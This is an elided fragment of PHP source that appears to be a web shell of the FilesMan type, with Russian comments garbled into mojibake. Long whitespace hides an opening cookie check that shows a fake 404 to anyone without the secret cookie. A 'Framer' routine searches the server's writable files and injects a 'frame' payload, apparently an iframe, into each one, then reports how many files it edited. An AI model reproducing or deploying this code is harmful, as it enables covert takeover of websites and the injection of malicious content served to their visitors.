<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  if (!isset($_COOKIE['d43b4772d491429c4621ce6356556c54'])) {header('HTTP/1.0 404 Not Found');exit;} ?> <?php
...
<input type=hidden name=charset>
	...
	$m = array('Files'=>'FilesMan','Framer'=>'Framer');
...
foreach ($files as $file)
{
      ...
      if (is_writable($file)) // Р•СЃР»Рё РїСЂР°РІР° РЅРѕСЂРј, С‚Рѕ
      {
	  
	  $str=file_get_contents($file); // РїРѕР»СѓС‡Р°РµРј СЃРѕРґРµСЂР¶РёРјРѕРµ С„Р°Р№Р»Р°
	  $sub_count= substr_count($str,$place); // substr_count -- Р’РѕР·РІСЂР°С‰Р°РµС‚ С‡РёСЃР»Рѕ РІС…РѕР¶РґРµРЅРёР№ РїРѕРґСЃС‚СЂРѕРєРё
	   if ($sub_count > 0) // РµСЃР»Рё РµСЃС‚СЊ С‚РµРєСЃС‚ РєРѕС‚РѕСЂС‹Р№ С…РѕС‚РёРј Р·Р°РјРµРЅРёС‚СЊ, С‚Рѕ
	   {
	    $repeat_count= substr_count($str,$frame);
		if ($repeat_count == 0)
		{
		$info['Replaces'] += $sub_count;
	    $info['Edited_files']++;
		//echo($file);
	    $str=str_replace($place,$frame,$str); //Р·Р°РјРµРЅСЏРµРј
	    file_put_contents($file,$str);  // РїРёС€РµРј РІ С„Р°Р№Р»
		}
        else $info['Repeat'] += $repeat_count; 
	   }
      }
   else  $info['Not_Writable']++; 
...
function actionFramer() {
	...
	{ 
		...
		echo '<table><tr><td>found files:</td><td>'.$info['Founded'].'</td><tr>
		   <tr><td>not available for writing:</td><td>'.$info['Not_Writable'].'</td><tr>
		   <tr><td>edited files:</td><td>'.$info['Edited_files'].'</td><tr>
		   <tr><td>all changes:</td><td>'.$info['Replaces'].'</td><tr>
		   <tr><td>found frame:</td><td>'.$info['Repeat'].'</td><tr>';
